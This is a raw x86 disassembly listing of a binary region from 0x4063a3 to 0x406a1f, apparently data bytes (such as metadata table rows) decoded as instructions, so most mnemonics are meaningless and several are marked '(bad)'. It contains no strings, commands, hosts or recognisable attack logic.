  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 05 0d 9a    	add    %dl,-0x65f2fb00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 12                	add    %dl,(%edx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	17                   	pop    %ss
  4063d3:	15 0e 00 14 00       	adc    $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 55 17 0a    	add    %dl,0xa175500(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 61 0e 1d    	add    %dl,0x1d0e6100(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 61 14 1d    	add    %dl,0x1d146100(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 fd                	add    %bh,%ch
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	17                   	pop    %ss
  406435:	15 0e 00 14 00       	adc    $0x14000e,%eax
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ef                	add    %ch,%bh
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 34 0d c7 00 14 00 	add    %dh,0x1400c7(,%ecx,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 19                	add    %bl,(%ecx)
  40645f:	12 53 00             	adc    0x0(%ebx),%dl
  406462:	15 00 7b 21 00       	adc    $0x217b00,%eax
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 dc 10 1d    	add    %dl,0x1d10dc00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 fd 19 0a    	add    %dl,0xa19fd00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 c9 18 c3    	add    %dl,-0x3ce73700(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 99 13 d5    	add    %dl,-0x2aec6700(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 8f 12 0a    	add    %dl,0xa128f00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 8d 06 c3    	add    %dl,-0x3cf97300(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 4e 1c 1d    	add    %dl,0x1d1c4e00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 43 1c 0a    	add    %dl,0xa1c4300(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 16    	add    %al,0x16209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 01    	add    %al,0x1209600(%eax)
  4064eb:	1c e4                	sbb    $0xe4,%al
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 17                	and    %dl,(%edi)
  406507:	1b f1                	sbb    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 83 0e ff 00 1d    	and    %al,0x1d00ff0e(%ebx)
  406527:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  40652d:	00 96 00 cc 0b 1c    	add    %dl,0x1c0bcc00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 7f 19 0a    	add    %dl,0xa197f00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 05 1a 0a 00 22    	add    %al,0x22000a1a
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 b8 0a 23    	add    %dl,0x230ab800(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 af 0a 2a 01 24    	add    %ch,0x24012a0a(%edi)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 98 0a 84    	add    %dl,-0x7bf56800(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 c4 1c 1d    	add    %dl,0x1d1cc400(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 b3 14 3e    	add    %dl,0x3e14b300(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 1d 15 0a 00 29    	sbb    %bl,0x29000a15
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	17                   	pop    %ss
  4065e7:	15 6b 01 29 00       	adc    $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 8e 1b 70    	add    %al,0x701b8e00(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 8e 1b 75    	add    %al,0x751b8e00(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	86 1b                	xchg   %bl,(%ebx)
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 86 1b 75    	add    %al,0x751b8600(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e8 0e 7c 01    	addl   $0x17c0ee8,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 1e                	add    %bl,(%esi)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 1e                	add    %bl,(%esi)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 54 16 2a    	add    %dl,0x2a165400(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b4 0c 93 01 33 00 	add    %dh,0x330193(%esp,%ecx,1)
  406678:	80 45 00 00          	addb   $0x0,0x0(%ebp)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 8e 0c 93 01 34    	add    %cl,0x3401930c(%esi)
  406685:	00 c8                	add    %cl,%al
  406687:	45                   	inc    %ebp
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 be 0c 93 01 35    	add    %bh,0x3501930c(%esi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 9b 16 84 01 36    	add    %bl,0x36018416(%ebx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	17                   	pop    %ss
  4066e3:	15 0e 00 3b 00       	adc    $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 1d 15 0a 00 3b    	sbb    %bl,0x3b000a15
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 17 15 b1    	add    %al,-0x4eeae8e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 e1                	or     %esp,%ecx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 cd                	add    %ecx,%ebp
  40671b:	1b bf 01 3c 00 63    	sbb    0x63003c01(%edi),%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 bc 19 0e 00 3c 00 	add    %edi,0x3c000e(%ecx,%ebx,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 17 15 cb    	add    %al,-0x34eae8e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d6 0f ee    	add    %al,-0x11f029f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	82 0d f4 01 42 00 e6 	orb    $0xe6,0x4201f4
  406791:	23 00                	and    (%eax),%eax
  406793:	00 00                	add    %al,(%eax)
  406795:	00 81 00 8c 07 6b    	add    %al,0x6b078c00(%ecx)
  40679b:	01 42 00             	add    %eax,0x0(%edx)
  40679e:	48                   	dec    %eax
  40679f:	46                   	inc    %esi
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 dc 12 0e 00    	addl   $0xe12dc,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 6e 0b 0a 02    	addl   $0x20a0b6e,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	26 19 dc             	es sbb %ebx,%esp
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 86 12 0f 02    	addl   $0x20f1286,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 60 1c 0f 02    	addl   $0x20f1c60,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	f0 13 15 02 47 00 5f 	lock adc 0x5f004702,%edx
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	e3 13                	jecxz  0x406863
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	10 19                	adc    %bl,(%ecx)
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	c0 16 2b             	rclb   $0x2b,(%esi)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 b5 16 31    	add    %al,0x3116b500(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 22                	add    %ah,(%edx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 a5 16 42    	add    %al,0x4216a500(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 61 06 42    	add    %al,0x42066100(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	46                   	inc    %esi
  4068bf:	19 dc                	sbb    %ebx,%esp
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	50                   	push   %eax
  4068cd:	0f 0e                	femms
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a8 0c 6b    	add    %al,0x6b0ca800(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 9c 0c 47    	add    %al,0x470c9c00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 80 10 4b    	add    %al,0x4b108000(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	3a 06                	cmp    (%esi),%al
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	1b 19                	sbb    (%ecx),%ebx
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	8b 16                	mov    (%esi),%edx
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	52                   	push   %edx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	98                   	cwtl
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	47                   	inc    %edi
  40694b:	16                   	push   %ss
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	67 0f                	(bad)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	74 0c                	je     0x406974
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	81 0c 6b 01 59 00 45 	orl    $0x45005901,(%ebx,%ebp,2)
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	c7                   	(bad)
  406983:	13 23                	adc    (%ebx),%esp
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	d5 13                	aad    $0x13
  406992:	15 02 5a 00 56       	adc    $0x56005a02,%eax
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	f8                   	clc
  40699f:	18 27                	sbb    %ah,(%edi)
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	04 19                	add    $0x19,%al
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 90 1c 5a    	add    %al,0x5a1c9008(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	f4                   	hlt
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	e0 14                	loopne 0x4069ec
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	17                   	pop    %ss
  4069e5:	15 0e 00 5c 00       	adc    $0x5c000e,%eax
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 45 0c b1    	add    %dl,-0x4ef3bb00(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 45 0c             	add    %al,0xc(%ebp)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 45 0c             	add    %al,0xc(%ebp)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 17 15 0e    	add    %al,0xe151718(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
